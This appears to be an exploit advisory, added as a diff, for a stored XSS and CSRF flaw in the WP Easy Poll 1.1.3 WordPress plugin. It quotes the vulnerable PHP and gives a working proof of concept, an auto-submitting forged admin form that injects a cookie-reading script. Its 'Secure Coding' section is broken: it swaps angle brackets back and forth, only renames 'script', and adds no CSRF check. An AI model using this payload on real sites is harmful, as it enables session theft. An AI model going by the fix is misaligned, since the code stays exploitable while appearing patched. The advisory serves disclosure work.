@@ -1,0 +1,68 @@
+Exploit Title: WP Easy Poll 1.1.3 XSS and CSRF
+Exploit Author : Ahn Sung Jun
+Date : 2015-12-09
+Vendor Homepage : https://wordpress.org/plugins/wp-easy-poll-afo/
+Software Link : https://downloads.wordpress.org/plugin/wp-easy-poll-afo.1.1.3.zip
+Version : 1.1.3
+Tested On : kail linux Iceweasel
+
+===========================================
+Vulnerable Code : wp_easy_poll.php
+if(isset($_REQUEST['action']) and $_REQUEST['action'] == 'p_add'){
+		global $wpdb;
+		$pc = new poll_class;
+		
+		/* Line 859 */
+		$insert = array('p_ques' => $_REQUEST['p_ques'], 'p_author' => $_REQUEST['p_author'], 'p_start' => $_REQUEST['p_start'], 'p_end' => $_REQUEST['p_end'], 'p_added' => date("Y-m-d H:i:s"), 'p_status' => $_REQUEST['p_status']);
+		
+		$wpdb->insert( $wpdb->prefix.$pc->table, $insert );
+		$new_poll_id = $wpdb->insert_id;
+		
+		$p_anss = $_REQUEST['p_anss'];
+		if(is_array($p_anss) and $new_poll_id){
+			foreach($p_anss as $key => $value){
+				if($value != ''){
+					$insert1 = array('p_id' => $new_poll_id, 'a_ans' => $value, 'a_order' => $key+1);
+					$wpdb->insert( $wpdb->prefix.$pc->table2, $insert1 );
+				}
+			}
+		}
+
+===========================================
+POC (XSS & CSRF)
+<html>
+	<body onload="javascript:document.forms[0].submit()">
+	<form name="f" action="http://192.168.0.8/wordpress/wp-admin/admin.php?page=easy_polls&action=add" method="post">
+	<input type="hidden" name="action" value="p_add" />
+	<input type="hidden" name="p_ques" value="<script>alert(document.cookie)</script>">
+	<input type="hidden" name="p_start" id="p_start" value="2015-11-18 22:55:52" required="required" />
+	<input type="hidden" name="p_end" id="p_end" value="2015-11-20 09:00:00" required="required"/>
+	<input type="submit" name="submit" value="Submit" class="button" />
+	</form>
+</html>
+
+===========================================
+Secure Coding
+if(isset($_REQUEST['action']) and $_REQUEST['action'] == 'p_add'){
+		global $wpdb;
+		$pc = new poll_class;
+
+		/* Secure Coding */
+            $_REQUEST['p_ques'] = str_replace("script", "x-script", $_REQUEST['p_ques']);
+			$_REQUEST['p_ques'] = str_replace("<", ">", $_REQUEST['p_ques']);
+			$_REQUEST['p_ques']= str_replace(">" ,"<", $_REQUEST['p_ques']);
+
+		$insert = array('p_ques' => $_REQUEST['p_ques'], 'p_author' => $_REQUEST['p_author'], 'p_start' => $_REQUEST['p_start'], 'p_end' => $_REQUEST['p_end'], 'p_added' => date("Y-m-d H:i:s"), 'p_status' => $_REQUEST['p_status']);
+		
+		$wpdb->insert( $wpdb->prefix.$pc->table, $insert );
+		$new_poll_id = $wpdb->insert_id;
+		
+		$p_anss = $_REQUEST['p_anss'];
+		if(is_array($p_anss) and $new_poll_id){
+			foreach($p_anss as $key => $value){
+				if($value != ''){
+					$insert1 = array('p_id' => $new_poll_id, 'a_ans' => $value, 'a_order' => $key+1);
+					$wpdb->insert( $wpdb->prefix.$pc->table2, $insert1 );
+				}
+			}
+		}
